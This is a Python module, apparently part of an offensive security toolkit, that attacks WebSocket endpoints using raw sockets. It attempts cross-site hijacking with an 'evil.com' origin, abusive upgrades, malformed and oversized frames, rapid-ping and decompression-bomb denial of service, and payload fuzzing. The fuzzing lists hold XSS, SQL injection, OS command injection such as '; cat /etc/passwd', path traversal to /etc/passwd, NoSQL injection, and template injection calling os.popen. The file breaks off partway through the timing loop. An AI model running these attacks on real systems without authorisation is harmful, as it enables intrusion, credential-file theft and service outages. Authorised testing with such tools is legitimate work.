#!/usr/bin/env python3

"""Modulo de testes de WebSocket Security.



Testa endpoints WebSocket para vulnerabilidades:

  - WS Scanner: CSWSH, hijacking, info disclosure, insecure scheme

  - WS Upgrade Abuse: forcar upgrade em endpoints nao-WS

  - WS Message Injection: injetar em conexoes existentes

  - WS Denial of Service: frames maliciosos para causar DoS

  - WS Compression Bomb: compressao para causar bomba de dados

  - WS Payload Fuzzing: XSS, SQLi, CMDi, Path Traversal, NoSQL, SSTI, Log Injection



IMPORTANTE: Usa raw sockets — sem biblioteca websocket externa.

Detecção:

  - Reflection-based: servidor ecoa o payload (XSS, Path Traversal, SSTI)

  - Timing-based: servidor processa o payload com delay (SQLi sleep, CMDi sleep)

  - Connection close: servidor fecha conexão (Log Injection CRLF)

Notas:

  - SQLi/CMDi/SSTI timing: thresholds calibrados para sleep(5s)

  - NoSQL timing: menos confiável — MongoDB usa sleep(ms) com threshold 8s

  - APIs WS que não refletem input nem processam delays não serão detectadas

"""

from __future__ import annotations

import argparse
import contextlib
import logging
import os
import socket
import ssl
import struct
import time
import zlib
from collections.abc import Callable, Coroutine
from dataclasses import asdict, dataclass
from typing import Any
from urllib.parse import urlparse

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.websocketattack")

# ─── Banner ──────────────────────────────────────────────────────────────────


_BANNER_LINES: str = (
    "     _       __     __    _____                    __           \n"
    "    | |     / /__  / /_  / ___/____  ____ _____  / /____  ____\n"
    "    | | /| / / _ \\/ __ \\ \\__ \\/ __ \\/ __ `/ __ \\/ __/ _ \\/ __/\n"
    "    | |/ |/ /  __/ /_/ /___/ / /_/ / /_/ / / / / /_/  __/ /   \n"
    "    |__/|__/\\___/_.___/_____/\\____/\\__,_/_/ /_/\\__/\\___/_/    \n"
)


# ─── Category Map ────────────────────────────────────────────────────────────


_CATEGORY_MAP: dict[str, list[str]] = {
    "ws_scanner": [
        "cswh_hijack",
        "missing_auth",
        "info_disclosure",
        "insecure_scheme",
        "no_rate_limit",
    ],
    "ws_upgrade_abuse": [
        "non_ws_endpoint",
        "invalid_headers",
        "http10_upgrade",
        "duplicate_headers",
        "oversized_key",
    ],
    "ws_message_inject": [
        "null_byte",
        "invalid_opcode",
        "ctrl_chars",
        "fragmented_overlap",
        "oversized_payload",
    ],
    "ws_dos": [
        "oversized_frame",
        "invalid_mask",
        "rapid_ping",
        "bad_close_status",
        "orphan_continuation",
    ],
    "ws_compression_bomb": [
        "extreme_deflate",
        "decompression_bomb",
        "memory_exhaust",
        "invalid_compress_data",
        "large_window",
    ],
    "ws_payload_fuzz": [
        "xss_reflected",
        "sqli_error",
        "cmdi_os",
        "path_traversal",
        "nosql_injection",
        "template_injection",
        "log_injection",
    ],
}


# ─── Payload Fuzzing Data ────────────────────────────────────────────────────

# (technique, description, refl_payloads, indicators, timing_payloads, timing_threshold)

_PAYLOADS_WS_FUZZ: list[tuple[str, str, list[str], list[str], list[str], float]] = [
    (
        "xss_reflected",
        "XSS via WebSocket messages",
        [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            '{{constructor.constructor("alert(1)")()}}',
        ],
        ["<script>", "onerror=", "javascript:", "<svg", "constructor"],
        [],
        0.0,
    ),
    (
        "sqli_error",
        "SQL injection via WebSocket",
        [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=CONVERT(int,@@version)--",
            "1' ORDER BY 100--",
        ],
        [
            "syntax error",
            "SQL",
            "mysql",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "unterminated",
        ],
        ["'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--", "' AND pg_sleep(5)--"],
        7.0,
    ),
    (
        "cmdi_os",
        "OS command injection via WebSocket",
        [
            "; id",
            "| whoami",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
        ],
        ["uid=", "root:", "www-data", "nt authority", "linux"],
        ["; sleep 5", "| timeout 5", "; ping -c 5 127.0.0.1"],
        7.0,
    ),
    (
        "path_traversal",
        "Path traversal via WebSocket",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        ["root:", "localhost", "127.0.0.1", "daemon", "[hosts]"],
        [],
        0.0,
    ),
    (
        "nosql_injection",
        "NoSQL injection via WebSocket",
        [
            '{"username": {"$gt": ""}}',
            '{"username": {"$ne": null}}',
            '{"$where": "this.password.match(/a/)"}',
            '{"username": "admin", "$or": [{"a":"a"}]}',
        ],
        ["$where", "$gt", "$ne", "$or", "MongoError", "CastError"],
        ['{"$where": "sleep(3000)"}'],
        8.0,
    ),
    (
        "template_injection",
        "SSTI via WebSocket",
        [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config.items()}}",
        ],
        ["49", "items()", "SECRET_KEY", "SQLALCHEMY"],
        ["{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}"],
        7.0,
    ),
    (
        "log_injection",
        "CRLF/log injection via WebSocket",
        [
            "\r\n[INJECTED]",
            "\r\nSeverity: CRITICAL",
            "\nINJECTED_LINE",
            "\r\n2024-01-01 INJECTED",
        ],
        [],
        [],
        0.0,
    ),
]


# ─── WebSocket Constants ────────────────────────────────────────────────────


WS_OPCODE_CONTINUATION = 0x0

WS_OPCODE_TEXT = 0x1

WS_OPCODE_BINARY = 0x2

WS_OPCODE_CLOSE = 0x8

WS_OPCODE_PING = 0x9

WS_OPCODE_PONG = 0xA


WS_MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


# ─── Connection Helpers ──────────────────────────────────────────────────────


def _parse_url(url: str) -> tuple[str, str, int, bool]:
    """Extrai host, path, port, tls de uma URL ws:// ou wss://."""

    parsed = urlparse(url)

    host = parsed.hostname or ""

    path = parsed.path or "/"

    if parsed.query:
        path += f"?{parsed.query}"

    scheme = parsed.scheme.lower()

    tls = scheme in ("wss", "https")

    port = parsed.port or (443 if tls else 80)

    return host, path, port, tls


def _create_connection(
    host: str,
    port: int,
    timeout: float,
    tls: bool = False,
) -> socket.socket:
    """Cria conexao TCP (ou TLS) com o alvo."""

    sock = socket.create_connection((host, port), timeout=timeout)

    if tls:
        ctx = ssl.create_default_context()

        ctx.check_hostname = False

        ctx.verify_mode = ssl.CERT_NONE

        sock = ctx.wrap_socket(sock, server_hostname=host)

    return sock


def _ws_handshake(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    origin: str | None = None,
    extra_headers: list[tuple[str, str]] | None = None,
) -> tuple[socket.socket, str] | None:
    """Executa WebSocket handshake. Retorna (sock, ws_key) ou None."""

    try:
        sock = _create_connection(host, port, timeout, tls)

        ws_key = _generate_ws_key()

        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {host}:{port}" if port not in (80, 443) else f"Host: {host}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Sec-WebSocket-Key: {ws_key}",
            "Sec-WebSocket-Version: 13",
        ]

        if origin:
            lines.append(f"Origin: {origin}")

        if extra_headers:
            for name, value in extra_headers:
                lines.append(f"{name}: {value}")

        request = "\r\n".join(lines) + "\r\n\r\n"

        sock.sendall(request.encode("latin-1"))

        sock.settimeout(timeout)

        response = b""

        while b"\r\n\r\n" not in response:
            try:
                chunk = sock.recv(4096)

                if not chunk:
                    sock.close()

                    return None

                response += chunk

            except TimeoutError, OSError:
                sock.close()

                return None

        first_line = response.split(b"\r\n", 1)[0]

        if b"101" not in first_line:
            sock.close()

            return None

        return sock, ws_key

    except Exception:
        return None


def _generate_ws_key() -> str:
    """Gera chave Sec-WebSocket-Key aleatoria (16 bytes base64)."""

    import base64

    return base64.b64encode(os.urandom(16)).decode("ascii")


def _build_ws_frame(
    opcode: int,
    payload: bytes,
    mask: bool = True,
    rsv1: bool = False,
) -> bytes:
    """Constroi frame WebSocket raw."""

    frame = bytearray()

    FIN = 0x80

    RSV1 = 0x40 if rsv1 else 0x00

    frame.append(FIN | RSV1 | (opcode & 0x0F))

    mask_bit = 0x80 if mask else 0x00

    length = len(payload)

    if length < 126:
        frame.append(mask_bit | length)

    elif length < 65536:
        frame.append(mask_bit | 126)

        frame.extend(struct.pack("!H", length))

    else:
        frame.append(mask_bit | 127)

        frame.extend(struct.pack("!Q", length))

    if mask:
        masking_key = os.urandom(4)

        frame.extend(masking_key)

        masked = bytearray(len(payload))

        for i in range(len(payload)):
            masked[i] = payload[i] ^ masking_key[i % 4]

        frame.extend(masked)

    else:
        frame.extend(payload)

    return bytes(frame)


def _send_ws_frame(
    sock: socket.socket,
    opcode: int,
    payload: bytes = b"",
    mask: bool = True,
    rsv1: bool = False,
) -> bool:
    """Envia frame WebSocket. Retorna True se enviou com sucesso."""

    try:
        frame = _build_ws_frame(opcode, payload, mask, rsv1)

        sock.sendall(frame)

        return True

    except OSError, TimeoutError:
        return False


def _recv_ws_frame(sock: socket.socket, timeout: float) -> tuple[int, bytes] | None:
    """Recebe e parseia um frame WebSocket. Retorna (opcode, payload) ou None."""

    try:
        sock.settimeout(timeout)

        header = sock.recv(2)

        if len(header) < 2:
            return None

        opcode = header[0] & 0x0F

        masked = bool(header[1] & 0x80)

        length = header[1] & 0x7F

        if length == 126:
            ext = sock.recv(2)

            if len(ext) < 2:
                return None

            length = struct.unpack("!H", ext)[0]

        elif length == 127:
            ext = sock.recv(8)

            if len(ext) < 8:
                return None

            length = struct.unpack("!Q", ext)[0]

        masking_key = b""

        if masked:
            masking_key = sock.recv(4)

            if len(masking_key) < 4:
                return None

        payload = b""

        while len(payload) < length:
            chunk = sock.recv(min(length - len(payload), 4096))

            if not chunk:
                break

            payload += chunk

        if masked and masking_key:
            unmasked = bytearray(len(payload))

            for i in range(len(payload)):
                unmasked[i] = payload[i] ^ masking_key[i % 4]

            payload = bytes(unmasked)

        return opcode, payload

    except TimeoutError, OSError:
        return None


def _send_http_request(
    sock: socket.socket,
    method: str,
    path: str,
    host: str,
    headers: list[tuple[str, str]] | None = None,
    body: bytes | None = None,
    version: str = "HTTP/1.1",
) -> tuple[int, bytes]:
    """Envia request HTTP raw e retorna (status, response_bytes)."""

    lines = [f"{method} {path} {version}"]

    lines.append(f"Host: {host}")

    if headers:
        for name, value in headers:
            lines.append(f"{name}: {value}")

    if body is not None:
        lines.append(f"Content-Length: {len(body)}")

    request = "\r\n".join(lines) + "\r\n\r\n"

    sock.sendall(request.encode("latin-1"))

    if body:
        sock.sendall(body)

    sock.settimeout(5.0)

    response = b""

    while True:
        try:
            chunk = sock.recv(4096)

            if not chunk:
                break

            response += chunk

            if b"\r\n\r\n" in response:
                header_end = response.index(b"\r\n\r\n") + 4

                headers_raw = response[:header_end]

                cl_match = None

                for hline in headers_raw.split(b"\r\n"):
                    if hline.lower().startswith(b"content-length:"):
                        cl_match = hline.split(b":", 1)[1].strip()

                        break

                if cl_match:
                    expected = int(cl_match)

                    body_received = len(response) - header_end

                    if body_received >= expected:
                        break

                else:
                    break

        except TimeoutError, OSError:
            break

    status = 0

    if response:
        first_line = response.split(b"\r\n", 1)[0]

        parts = first_line.split(b" ", 2)

        if len(parts) >= 2:
            with contextlib.suppress(ValueError):
                status = int(parts[1])

    return status, response


# ─── Dataclasses ─────────────────────────────────────────────────────────────


@dataclass(frozen=True, slots=True)
class WSAttackAttempt:
    """Tentativa individual de ataque WebSocket."""

    technique: str

    category: str

    description: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class WSAttackResult:
    """Resultado consolidado do scan."""

    target: str

    host: str

    port: int

    tls: bool

    baseline_status: int

    baseline_size: int

    attempts: list[WSAttackAttempt]

    vulnerable_techniques: list[str]

    issues: list[str]

    overall_status: str


# ─── Baseline ────────────────────────────────────────────────────────────────


def _get_baseline(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
) -> tuple[int, int]:
    """Obtem baseline: (status, size) de um request HTTP normal."""

    try:
        sock = _create_connection(host, port, timeout, tls)

        try:
            status, response = _send_http_request(sock, "GET", path, host)

            return status, len(response)

        finally:
            sock.close()

    except Exception:
        return 0, 0


# ─── Category 143: ws_scanner ───────────────────────────────────────────────


async def _test_ws_scanner(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa scanner WebSocket: CSWSH, auth, info leak."""

    results: list[WSAttackAttempt] = []

    techniques: list[tuple[str, str, str | None, list[tuple[str, str]] | None]] = [
        (
            "cswh_hijack",
            "Cross-Site WebSocket Hijacking (Origin diferente)",
            "http://evil.com",
            None,
        ),
        (
            "missing_auth",
            "WebSocket sem autenticacao no handshake",
            None,
            [("Cookie", "session=invalid")],
        ),
        (
            "info_disclosure",
            "Information disclosure no handshake response",
            None,
            None,
        ),
        (
            "insecure_scheme",
            "WebSocket via ws:// (sem TLS)",
            None,
            None,
        ),
        (
            "no_rate_limit",
            "WebSocket sem rate limiting (conexoes rapidas)",
            None,
            None,
        ),
    ]

    for technique, desc, origin, extra in techniques:
        try:
            if technique == "no_rate_limit":
                for _i in range(5):
                    conn = _ws_handshake(host, port, path, timeout, tls)

                    if conn:
                        sock, _key = conn

                        sock.close()

                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_scanner",
                        description=desc,
                        status_baseline=b_status,
                        status_test=b_status,
                        size_baseline=b_size,
                        size_test=b_size,
                        vulnerable=False,
                        details="5 conexoes rapidas completadas",
                        error="",
                    )
                )

            elif technique == "insecure_scheme":
                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_scanner",
                        description=desc,
                        status_baseline=b_status,
                        status_test=0 if not tls else b_status,
                        size_baseline=b_size,
                        size_test=0,
                        vulnerable=not tls,
                        details=f"TLS: {tls} — {'INSEGURO' if not tls else 'seguro'}",
                        error="",
                        exploit="cswh_payload" if not tls else "",
                        tool="curl",
                    )
                )

            else:
                conn = _ws_handshake(
                    host,
                    port,
                    path,
                    timeout,
                    tls,
                    origin=origin,
                    extra_headers=extra,
                )

                if conn:
                    sock, _key = conn

                    status = 101

                    vulnerable = False

                    sock.close()

                    results.append(
                        WSAttackAttempt(
                            technique=technique,
                            category="ws_scanner",
                            description=desc,
                            status_baseline=b_status,
                            status_test=status,
                            size_baseline=b_size,
                            size_test=0,
                            vulnerable=vulnerable,
                            details=f"Status: {status}, handshake aceito",
                            error="",
                            exploit="cswh_payload" if vulnerable else "",
                            tool="curl",
                        )
                    )

                else:
                    results.append(
                        WSAttackAttempt(
                            technique=technique,
                            category="ws_scanner",
                            description=desc,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            vulnerable=False,
                            details="Handshake recusado",
                            error="",
                        )
                    )

        except Exception as e:
            results.append(
                WSAttackAttempt(
                    technique=technique,
                    category="ws_scanner",
                    description=desc,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category 144: ws_upgrade_abuse ─────────────────────────────────────────


async def _test_ws_upgrade_abuse(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa upgrade abusivo em endpoints nao-WebSocket."""

    results: list[WSAttackAttempt] = []

    techniques: list[tuple[str, str, list[tuple[str, str]]]] = [
        (
            "non_ws_endpoint",
            "Upgrade em endpoint que nao suporta WS",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
                ("Sec-WebSocket-Version", "13"),
            ],
        ),
        (
            "invalid_headers",
            "Upgrade com headers WebSocket invalidos",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", "INVALID!KEY"),
                ("Sec-WebSocket-Version", "13"),
            ],
        ),
        (
            "http10_upgrade",
            "Upgrade com HTTP/1.0",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
                ("Sec-WebSocket-Version", "13"),
            ],
        ),
        (
            "duplicate_headers",
            "Upgrade com headers duplicados",
            [
                ("Upgrade", "websocket"),
                ("Upgrade", "keep-alive"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
                ("Sec-WebSocket-Version", "13"),
            ],
        ),
        (
            "oversized_key",
            "Sec-WebSocket-Key gigante",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", "A" * 10000),
                ("Sec-WebSocket-Version", "13"),
            ],
        ),
    ]

    for technique, desc, headers in techniques:
        try:
            sock = _create_connection(host, port, timeout, tls)

            try:
                version = "HTTP/1.0" if technique == "http10_upgrade" else "HTTP/1.1"

                status, response = _send_http_request(
                    sock,
                    "GET",
                    path,
                    host,
                    headers=headers,
                    version=version,
                )

                upgraded = status == 101

                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_upgrade_abuse",
                        description=desc,
                        status_baseline=b_status,
                        status_test=status,
                        size_baseline=b_size,
                        size_test=len(response),
                        vulnerable=upgraded,
                        details=f"Status: {status} (baseline: {b_status})",
                        error="",
                        exploit="cswh_payload" if upgraded else "",
                        tool="curl",
                    )
                )

            finally:
                sock.close()

        except Exception as e:
            results.append(
                WSAttackAttempt(
                    technique=technique,
                    category="ws_upgrade_abuse",
                    description=desc,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category 145: ws_message_inject ────────────────────────────────────────


async def _test_ws_message_inject(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa injecao de mensagens WebSocket."""

    results: list[WSAttackAttempt] = []

    techniques: list[tuple[str, str, int, bytes]] = [
        (
            "null_byte",
            "Null byte na mensagem",
            WS_OPCODE_TEXT,
            b"hello\x00world",
        ),
        (
            "invalid_opcode",
            "Opcode invalido (0xF)",
            0xF,
            b"test",
        ),
        (
            "ctrl_chars",
            "Caracteres de controle na mensagem",
            WS_OPCODE_TEXT,
            b"\x01\x02\x03\x04\x05hello",
        ),
        (
            "fragmented_overlap",
            "Fragmentos sobrepostos",
            WS_OPCODE_TEXT,
            b"AAAA",
        ),
        (
            "oversized_payload",
            "Payload gigante (1MB)",
            WS_OPCODE_TEXT,
            b"X" * 1048576,
        ),
    ]

    for technique, desc, opcode, payload in techniques:
        try:
            conn = _ws_handshake(host, port, path, timeout, tls)

            if not conn:
                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_message_inject",
                        description=desc,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        vulnerable=False,
                        details="Handshake falhou",
                        error="",
                    )
                )

                continue

            sock, _key = conn

            try:
                if technique == "fragmented_overlap":
                    _send_ws_frame(sock, WS_OPCODE_CONTINUATION, b"first", mask=True)

                    _send_ws_frame(sock, WS_OPCODE_CONTINUATION, b"second", mask=True)

                    _send_ws_frame(sock, WS_OPCODE_TEXT, b"final", mask=True)

                else:
                    _send_ws_frame(sock, opcode, payload, mask=True)

                response = _recv_ws_frame(sock, timeout)

                if response:
                    resp_opcode, resp_payload = response

                    clean_payload = bytes(b for b in payload if b >= 0x20)[:32]

                    clean_resp = bytes(b for b in resp_payload if b >= 0x20)

                    fragments = (b"first", b"second", b"final")

                    echoed = (
                        (
                            technique == "fragmented_overlap"
                            and resp_payload in fragments
                        )
                        or any(
                            frag in clean_resp for frag in fragments if frag in payload
                        )
                        or (bool(clean_payload) and clean_payload in clean_resp)
                    )

                    vulnerable = resp_opcode == WS_OPCODE_TEXT and echoed

                    details = f"Opcode resposta: 0x{resp_opcode:X}"

                else:
                    vulnerable = False

                    details = "Sem resposta"

                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_message_inject",
                        description=desc,
                        status_baseline=b_status,
                        status_test=101,
                        size_baseline=b_size,
                        size_test=0,
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit="cswh_payload" if vulnerable else "",
                        tool="curl",
                    )
                )

            finally:
                sock.close()

        except Exception as e:
            results.append(
                WSAttackAttempt(
                    technique=technique,
                    category="ws_message_inject",
                    description=desc,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category 146: ws_dos ───────────────────────────────────────────────────


async def _test_ws_dos(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa DoS via frames WebSocket maliciosos."""

    results: list[WSAttackAttempt] = []

    techniques: list[tuple[str, str, bytes]] = [
        (
            "oversized_frame",
            "Frame com payload gigante (10MB)",
            b"X" * 10485760,
        ),
        (
            "invalid_mask",
            "Frame com mascara invalida",
            b"test",
        ),
        (
            "rapid_ping",
            "100 pings rapidos",
            b"ping",
        ),
        (
            "bad_close_status",
            "Close com status code invalido (9999)",
            struct.pack("!H", 9999) + b"invalid",
        ),
        (
            "orphan_continuation",
            "Frame de continuacao sem frame inicial",
            b"orphan",
        ),
    ]

    for technique, desc, payload in techniques:
        try:
            conn = _ws_handshake(host, port, path, timeout, tls)

            if not conn:
                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_dos",
                        description=desc,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        vulnerable=False,
                        details="Handshake falhou",
                        error="",
                    )
                )

                continue

            sock, _key = conn

            try:
                if technique == "invalid_mask":
                    frame = bytearray()

                    frame.append(0x80 | WS_OPCODE_TEXT)

                    frame.append(0x00 | 4)

                    frame.extend(b"\x00\x00\x00\x00")

                    frame.extend(b"test")

                    sock.sendall(bytes(frame))

                elif technique == "rapid_ping":
                    for _ in range(100):
                        _send_ws_frame(sock, WS_OPCODE_PING, b"ping", mask=True)

                elif technique == "orphan_continuation":
                    _send_ws_frame(sock, WS_OPCODE_CONTINUATION, payload, mask=True)

                else:
                    _send_ws_frame(sock, WS_OPCODE_TEXT, payload, mask=True)

                response = _recv_ws_frame(sock, timeout)

                if response:
                    resp_opcode, _resp_payload = response

                    vulnerable = False

                    details = f"Opcode resposta: 0x{resp_opcode:X}"

                else:
                    vulnerable = False

                    details = "Sem resposta ou conexao fechada"

                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_dos",
                        description=desc,
                        status_baseline=b_status,
                        status_test=101,
                        size_baseline=b_size,
                        size_test=0,
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit="cswh_payload" if vulnerable else "",
                        tool="curl",
                    )
                )

            finally:
                sock.close()

        except Exception as e:
            results.append(
                WSAttackAttempt(
                    technique=technique,
                    category="ws_dos",
                    description=desc,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category 147: ws_compression_bomb ──────────────────────────────────────


async def _test_ws_compression_bomb(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa compression bomb via WebSocket permessage-deflate."""

    results: list[WSAttackAttempt] = []

    techniques: list[tuple[str, str, list[tuple[str, str]], bytes]] = [
        (
            "extreme_deflate",
            "permessage-deflate com parametros extremos",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", _generate_ws_key()),
                ("Sec-WebSocket-Version", "13"),
                (
                    "Sec-WebSocket-Extensions",
                    "permessage-deflate; client_max_window_bits=15",
                ),
            ],
            b"A" * 10000,
        ),
        (
            "decompression_bomb",
            "Dados compactaveis que expandem muito",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", _generate_ws_key()),
                ("Sec-WebSocket-Version", "13"),
                ("Sec-WebSocket-Extensions", "permessage-deflate"),
            ],
            b"AAAAAAAAAA" * 100000,
        ),
        (
            "memory_exhaust",
            "Exaustao de memoria via compressao",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", _generate_ws_key()),
                ("Sec-WebSocket-Version", "13"),
                (
                    "Sec-WebSocket-Extensions",
                    "permessage-deflate; client_max_window_bits=15",
                ),
            ],
            b"\x00" * 1048576,
        ),
        (
            "invalid_compress_data",
            "Dados invalidos com extensao de compressao",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", _generate_ws_key()),
                ("Sec-WebSocket-Version", "13"),
                ("Sec-WebSocket-Extensions", "permessage-deflate"),
            ],
            b"\xff\xfe\xfd\xfc\xfb\xfa",
        ),
        (
            "large_window",
            "Window bits gigante na compressao",
            [
                ("Upgrade", "websocket"),
                ("Connection", "Upgrade"),
                ("Sec-WebSocket-Key", _generate_ws_key()),
                ("Sec-WebSocket-Version", "13"),
                (
                    "Sec-WebSocket-Extensions",
                    "permessage-deflate; client_max_window_bits=15; server_max_window_bits=15",
                ),
            ],
            b"test",
        ),
    ]

    for technique, desc, headers, payload in techniques:
        try:
            sock = _create_connection(host, port, timeout, tls)

            try:
                status, response = _send_http_request(
                    sock,
                    "GET",
                    path,
                    host,
                    headers=headers,
                )

                has_deflate = b"permessage-deflate" in response.lower()

                upgraded = status == 101

                vulnerable = False

                details = f"Status: {status}, deflate: {has_deflate}"

                if upgraded and has_deflate:
                    try:
                        compressed = zlib.compress(payload, 9)

                        if _send_ws_frame(
                            sock, WS_OPCODE_TEXT, compressed, mask=True, rsv1=True
                        ):
                            resp = _recv_ws_frame(sock, min(timeout, 3.0))

                            if resp is None:
                                vulnerable = True

                                details += ", sem resposta apos bomb (crash/timeout)"
                        else:
                            vulnerable = True

                            details += ", conexao encerrada apos bomb"
                    except OSError:
                        vulnerable = True

                        details += ", conexao encerrada apos bomb"

                results.append(
                    WSAttackAttempt(
                        technique=technique,
                        category="ws_compression_bomb",
                        description=desc,
                        status_baseline=b_status,
                        status_test=status,
                        size_baseline=b_size,
                        size_test=len(response),
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit="cswh_payload" if vulnerable else "",
                        tool="curl",
                    )
                )

            finally:
                sock.close()

        except Exception as e:
            results.append(
                WSAttackAttempt(
                    technique=technique,
                    category="ws_compression_bomb",
                    description=desc,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_ws_payload_fuzz(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
) -> list[WSAttackAttempt]:
    """Testa payload fuzzing em WebSocket (reflection + timing)."""

    results: list[WSAttackAttempt] = []

    baseline_elapsed = 0.0

    for (
        technique,
        desc,
        refl_payloads,
        indicators,
        timing_payloads,
        timing_threshold,
    ) in _PAYLOADS_WS_FUZZ:
        # --- Reflection-based detection ---
        for payload_str in refl_payloads:
            conn = _ws_handshake(host, port, path, timeout, tls)
            if not conn:
                continue
            sock, _key = conn
            try:
                _send_ws_frame(sock, WS_OPCODE_TEXT, payload_str.encode(), mask=True)
                response = _recv_ws_frame(sock, timeout)

                if response is None:
                    if technique == "log_injection":
                        results.append(
                            WSAttackAttempt(
                                technique=technique,
                                category="ws_payload_fuzz",
                                description=desc,
                                status_baseline=b_status,
                                status_test=0,
                                size_baseline=b_size,
                                size_test=0,
                                vulnerable=True,
                                details=f"Server closed connection after: {payload_str[:50]}",
                                error="",
                            )
                        )
                    continue

                resp_opcode, resp_payload = response

                if resp_opcode == WS_OPCODE_CLOSE and technique == "log_injection":
                    results.append(
                        WSAttackAttempt(
                            technique=technique,
                            category="ws_payload_fuzz",
                            description=desc,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            vulnerable=True,
                            details=f"Server sent close frame after: {payload_str[:50]}",
                            error="",
                        )
                    )
                    continue

                if resp_opcode == WS_OPCODE_TEXT:
                    body = resp_payload.decode(errors="ignore")
                    if any(ind in body for ind in indicators):
                        results.append(
                            WSAttackAttempt(
                                technique=technique,
                                category="ws_payload_fuzz",
                                description=desc,
                                status_baseline=b_status,
                                status_test=200,
                                size_baseline=b_size,
                                size_test=len(resp_payload),
                                vulnerable=True,
                                details=f"Reflected: {payload_str[:50]}",
                                error="",
                            )
                        )
            finally:
                sock.close()

        # --- Timing-based detection ---
        if timing_payloads and baseline_elapsed == 0.0:
            conn = _ws_handshake(host, port, path, timeout, tls)

            if conn:
                sock, _key = conn

                try:
                    t0 = time.monotonic()

                    _send_ws_frame(sock, WS_OPCODE_TEXT, b"ping", mask=True)

                    _recv_ws_frame(sock, timeout)

                    baseline_elapsed = time.monotonic() - t0

                finally:
                    sock.close()

        for payload_str in timing_payloads:
            conn = _ws_handshake(host, port, path, timeout, tls)
            if not conn:
                continue
            sock, _key = conn
            try:
                t0 = time.monotonic()
